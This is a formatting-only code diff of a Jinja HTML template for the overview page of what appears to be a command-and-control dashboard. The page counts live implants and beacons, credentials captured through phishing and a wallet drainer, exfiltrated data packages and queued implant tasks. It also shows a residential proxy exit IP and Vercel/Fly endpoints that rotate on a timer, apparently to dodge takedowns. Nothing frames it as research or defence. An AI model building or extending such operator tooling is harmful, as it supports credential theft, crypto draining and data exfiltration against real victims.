@@ -1,151 +1,174 @@
 <!-- templates/overview.html -->
-{% extends "base.html" %}
-{% block title %}Overview{% endblock %}
-{% block nav_overview %}active{% endblock %}
-
-{% block content %}
+{% extends "base.html" %} {% block title %}Overview{% endblock %} {% block
+nav_overview %}active{% endblock %} {% block content %}
 <div class="page-header">
-    <h2><span class="live-dot"></span>Operation Overview</h2>
-    <div class="meta" id="cycle-meta">
-        {% if cycle.status == "active" %}
-            Cycle {{ cycle.cycle_count }} · {{ cycle.cycle_ts }} · Next rotation in {{ cycle.remaining_seconds // 60 }}m {{ cycle.remaining_seconds % 60 }}s
-        {% else %}
-            Initializing rotation engine...
-        {% endif %}
-    </div>
+  <h2><span class="live-dot"></span>Operation Overview</h2>
+  <div class="meta" id="cycle-meta">
+    {% if cycle.status == "active" %} Cycle {{ cycle.cycle_count }} · {{
+    cycle.cycle_ts }} · Next rotation in {{ cycle.remaining_seconds // 60 }}m {{
+    cycle.remaining_seconds % 60 }}s {% else %} Initializing rotation engine...
+    {% endif %}
+  </div>
 </div>
 
 <!-- Stat cards -->
 <div class="stat-grid">
-    <div class="stat-card">
-        <div class="stat-label">Active Deployments</div>
-        <div class="stat-value blue">{{ active_deployments }}</div>
-        <div class="stat-meta">Vercel + Fly endpoints</div>
+  <div class="stat-card">
+    <div class="stat-label">Active Deployments</div>
+    <div class="stat-value blue">{{ active_deployments }}</div>
+    <div class="stat-meta">Vercel + Fly endpoints</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Live Implants</div>
+    <div class="stat-value green">{{ beacon_count }}</div>
+    <div class="stat-meta">Beacons received</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Credentials Captured</div>
+    <div class="stat-value purple">{{ cred_count }}</div>
+    <div class="stat-meta">Phishing + drainer</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Exfil Entries</div>
+    <div class="stat-value yellow">{{ exfil_count }}</div>
+    <div class="stat-meta">Data packages</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Queued Tasks</div>
+    <div class="stat-value red">{{ task_count }}</div>
+    <div class="stat-meta">Pending delivery</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Proxy Exit IP</div>
+    <div class="stat-value" style="font-size: 16px" id="proxy-ip">
+      {{ proxy.exit_ip if proxy else 'N/A' }}
     </div>
-    <div class="stat-card">
-        <div class="stat-label">Live Implants</div>
-        <div class="stat-value green">{{ beacon_count }}</div>
-        <div class="stat-meta">Beacons received</div>
-    </div>
-    <div class="stat-card">
-        <div class="stat-label">Credentials Captured</div>
-        <div class="stat-value purple">{{ cred_count }}</div>
-        <div class="stat-meta">Phishing + drainer</div>
-    </div>
-    <div class="stat-card">
-        <div class="stat-label">Exfil Entries</div>
-        <div class="stat-value yellow">{{ exfil_count }}</div>
-        <div class="stat-meta">Data packages</div>
-    </div>
-    <div class="stat-card">
-        <div class="stat-label">Queued Tasks</div>
-        <div class="stat-value red">{{ task_count }}</div>
-        <div class="stat-meta">Pending delivery</div>
-    </div>
-    <div class="stat-card">
-        <div class="stat-label">Proxy Exit IP</div>
-        <div class="stat-value" style="font-size:16px;" id="proxy-ip">{{ proxy.exit_ip if proxy else 'N/A' }}</div>
-        <div class="stat-meta">Residential egress</div>
-    </div>
+    <div class="stat-meta">Residential egress</div>
+  </div>
 </div>
 
 <!-- Rotation progress -->
-<div class="card" style="margin-top:24px;">
-    <div class="card-header">
-        <div class="card-title">Rotation Cycle Progress</div>
-        <div class="card-subtitle" id="rotation-timer">
-            {% if cycle.status == "active" %}
-                {{ cycle.elapsed_seconds // 60 }}m elapsed · {{ cycle.remaining_seconds // 60 }}m remaining
-            {% endif %}
-        </div>
+<div class="card" style="margin-top: 24px">
+  <div class="card-header">
+    <div class="card-title">Rotation Cycle Progress</div>
+    <div class="card-subtitle" id="rotation-timer">
+      {% if cycle.status == "active" %} {{ cycle.elapsed_seconds // 60 }}m
+      elapsed · {{ cycle.remaining_seconds // 60 }}m remaining {% endif %}
     </div>
-    {% if cycle.status == "active" %}
-        {% set progress = ((cycle.elapsed_seconds / (cycle.remaining_seconds + cycle.elapsed_seconds)) * 100) | round(1) %}
-        <div class="progress-bar">
-            <div class="progress-fill" id="progress-fill" data-progress="{{ progress }}"></div>
-        </div>
-        <script>
-            document.addEventListener('DOMContentLoaded', function() {
-                var fill = document.getElementById('progress-fill');
-                if (fill && fill.dataset.progress) {
-                    fill.style.width = fill.dataset.progress + '%';
-                }
-            });
-        </script>
-    {% else %}
-        <div style="color:var(--text-dim);font-size:13px;">Waiting for first rotation cycle to complete...</div>
-    {% endif %}
+  </div>
+  {% if cycle.status == "active" %} {% set progress = ((cycle.elapsed_seconds /
+  (cycle.remaining_seconds + cycle.elapsed_seconds)) * 100) | round(1) %}
+  <div class="progress-bar">
+    <div
+      class="progress-fill"
+      id="progress-fill"
+      data-progress="{{ progress }}"
+    ></div>
+  </div>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var fill = document.getElementById("progress-fill");
+      if (fill && fill.dataset.progress) {
+        fill.style.width = fill.dataset.progress + "%";
+      }
+    });
+  </script>
+  {% else %}
+  <div style="color: var(--text-dim); font-size: 13px">
+    Waiting for first rotation cycle to complete...
+  </div>
+  {% endif %}
 </div>
 
 <!-- Active endpoints -->
-<div class="card" style="margin-top:16px;">
-    <div class="card-header">
-        <div class="card-title">Active Endpoints</div>
-        <div class="card-subtitle">Current cycle · auto-rotates every {{ cycle.remaining_seconds // 60 if cycle.status == "active" else 60 }} min</div>
+<div class="card" style="margin-top: 16px">
+  <div class="card-header">
+    <div class="card-title">Active Endpoints</div>
+    <div class="card-subtitle">
+      Current cycle · auto-rotates every {{ cycle.remaining_seconds // 60 if
+      cycle.status == "active" else 60 }} min
     </div>
-    <table>
-        <thead>
-            <tr><th>Name</th><th>URL</th><th>Status</th></tr>
-        </thead>
-        <tbody>
-            {% for ep in endpoints %}
-            <tr>
-                <td class="mono">{{ ep.name }}</td>
-                <td><a href="{{ ep.url }}" target="_blank" class="mono">{{ ep.url }}</a></td>
-                <td><span class="badge green">Live</span></td>
-            </tr>
-            {% else %}
-            <tr><td colspan="3" style="color:var(--text-dim);">No active endpoints. Waiting for first cycle...</td></tr>
-            {% endfor %}
-        </tbody>
-    </table>
+  </div>
+  <table>
+    <thead>
+      <tr>
+        <th>Name</th>
+        <th>URL</th>
+        <th>Status</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for ep in endpoints %}
+      <tr>
+        <td class="mono">{{ ep.name }}</td>
+        <td>
+          <a href="{{ ep.url }}" target="_blank" class="mono">{{ ep.url }}</a>
+        </td>
+        <td><span class="badge green">Live</span></td>
+      </tr>
+      {% else %}
+      <tr>
+        <td colspan="3" style="color: var(--text-dim)">
+          No active endpoints. Waiting for first cycle...
+        </td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
 </div>
 
 <!-- Last sync -->
-<div style="text-align:center; color:var(--text-dim); font-size:11px; margin-top:24px;">
-    Last synced from Fly VM: <span id="last-sync">{{ last_sync | int }}</span>s ago
-    · Auto-refresh: 15s
+<div
+  style="
+    text-align: center;
+    color: var(--text-dim);
+    font-size: 11px;
+    margin-top: 24px;
+  "
+>
+  Last synced from Fly VM: <span id="last-sync">{{ last_sync | int }}</span>s
+  ago · Auto-refresh: 15s
 </div>
-{% endblock %}
-
-{% block scripts %}
+{% endblock %} {% block scripts %}
 <script>
-// Live update the overview stats every 15 seconds
-async function refreshStatus() {
+  // Live update the overview stats every 15 seconds
+  async function refreshStatus() {
     try {
-        const resp = await fetch('/api/status');
-        const data = await resp.json();
+      const resp = await fetch("/api/status");
+      const data = await resp.json();
 
-        // Update cycle meta
-        if (data.cycle.status === 'active') {
-            const remaining = data.cycle.remaining_seconds;
-            const elapsed = data.cycle.elapsed_seconds;
-            const meta = document.getElementById('cycle-meta');
-            if (meta) meta.textContent = `Cycle ${data.cycle.cycle_count} · ${data.cycle.cycle_ts} · Next rotation in ${Math.floor(remaining/60)}m ${remaining%60}s`;
+      // Update cycle meta
+      if (data.cycle.status === "active") {
+        const remaining = data.cycle.remaining_seconds;
+        const elapsed = data.cycle.elapsed_seconds;
+        const meta = document.getElementById("cycle-meta");
+        if (meta)
+          meta.textContent = `Cycle ${data.cycle.cycle_count} · ${data.cycle.cycle_ts} · Next rotation in ${Math.floor(remaining / 60)}m ${remaining % 60}s`;
 
-            const timer = document.getElementById('rotation-timer');
-            if (timer) timer.textContent = `${Math.floor(elapsed/60)}m elapsed · ${Math.floor(remaining/60)}m remaining`;
+        const timer = document.getElementById("rotation-timer");
+        if (timer)
+          timer.textContent = `${Math.floor(elapsed / 60)}m elapsed · ${Math.floor(remaining / 60)}m remaining`;
 
-            const fill = document.getElementById('progress-fill');
-            if (fill) {
-                const pct = (elapsed / (elapsed + remaining)) * 100;
-                fill.style.width = pct.toFixed(1) + '%';
-            }
+        const fill = document.getElementById("progress-fill");
+        if (fill) {
+          const pct = (elapsed / (elapsed + remaining)) * 100;
+          fill.style.width = pct.toFixed(1) + "%";
         }
+      }
 
-        // Update proxy IP
-        const proxyEl = document.getElementById('proxy-ip');
-        if (proxyEl) proxyEl.textContent = data.proxy_exit_ip || 'N/A';
+      // Update proxy IP
+      const proxyEl = document.getElementById("proxy-ip");
+      if (proxyEl) proxyEl.textContent = data.proxy_exit_ip || "N/A";
 
-        // Update last sync
-        const syncEl = document.getElementById('last-sync');
-        if (syncEl) {
-            const ago = Math.floor(Date.now()/1000 - data.last_sync);
-            syncEl.textContent = ago;
-        }
+      // Update last sync
+      const syncEl = document.getElementById("last-sync");
+      if (syncEl) {
+        const ago = Math.floor(Date.now() / 1000 - data.last_sync);
+        syncEl.textContent = ago;
+      }
     } catch (e) {}
-}
-setInterval(refreshStatus, 15000);
-refreshStatus();
+  }
+  setInterval(refreshStatus, 15000);
+  refreshStatus();
 </script>
 {% endblock %}
